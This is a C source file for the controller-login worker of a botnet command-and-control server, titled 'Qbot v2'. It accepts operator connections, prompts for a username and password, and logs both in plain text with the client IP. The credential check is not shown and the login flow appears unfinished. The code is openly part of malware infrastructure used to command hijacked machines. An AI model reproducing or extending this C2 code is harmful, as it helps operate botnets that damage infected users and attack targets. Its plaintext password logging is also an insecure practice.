#include "headers/worker.h"

void *cnc_worker(void *worker_args) {
    HandlerInfo *handler_info = (HandlerInfo *)worker_args;
    ClientInfo *client_info = calloc(1, sizeof(ClientInfo));

    if (!handler_info)
        goto end;

    if (!client_info)
        goto end;

    client_info->logged_in = false;
    client_info->ip_address = get_socket_ip(handler_info->client_fd, *handler_info->client_addr);
    
    printf("EVENT: cnc_worker() -> New controller client connected from: %s\n", client_info->ip_address);

    set_terminal_title(handler_info->client_fd, "Qbot v2 - Login");
    int bytes_read = 0;

    if (send(handler_info->client_fd, "Username: ", 10, MSG_NOSIGNAL) < 0)
        goto end;

    if ((bytes_read = recv(handler_info->client_fd, client_info->username, sizeof(client_info->username), MSG_NOSIGNAL)) <= 0)
        goto end;

    strip_input(client_info->username, &bytes_read);
    printf("EVENT: cnc_worker() -> Username for login passed: %s from %s\n", client_info->username , client_info->ip_address);

    if (send(handler_info->client_fd, "Password: ", 10, MSG_NOSIGNAL) < 0)
        goto end;

    if ((bytes_read = recv(handler_info->client_fd, client_info->password, sizeof(client_info->password), MSG_NOSIGNAL)) <= 0)
        goto end;

    strip_input(client_info->password, &bytes_read);
    printf("EVENT: cnd_worker() -> Password for login passed: %s from %s\n", client_info->password, client_info->ip_address);

    end:
        handle_client_exit(handler_info, client_info);
    return NULL;
}